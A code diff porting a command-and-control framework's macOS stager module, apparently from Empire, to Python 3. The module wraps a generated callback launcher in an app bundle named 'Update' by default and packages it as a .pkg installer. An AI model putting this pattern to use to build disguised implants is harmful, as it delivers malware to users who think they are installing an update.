@@ -1,6 +1,8 @@
+from __future__ import print_function
+from builtins import object
 from lib.common import helpers
 
-class Stager:
+class Stager(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -82,14 +84,14 @@ class Stager:
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, userAgent=userAgent, safeChecks=SafeChecks)
 
         if launcher == "":
-            print helpers.color("[!] Error in launcher command generation.")
+            print(helpers.color("[!] Error in launcher command generation."))
             return ""
 
         else:
             if AppName == '':
                 AppName = "Update"
             Disarm=True
-            launcherCode = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")
+            launcherCode = launcher.strip('echo').strip(' | python3 &').strip("\"")
             ApplicationZip = self.mainMenu.stagers.generate_appbundle(launcherCode=launcherCode,Arch=arch,icon=icnsPath,AppName=AppName,disarm=Disarm)
             pkginstaller = self.mainMenu.stagers.generate_pkg(launcher=launcher,bundleZip=ApplicationZip,AppName=AppName)
             return pkginstaller
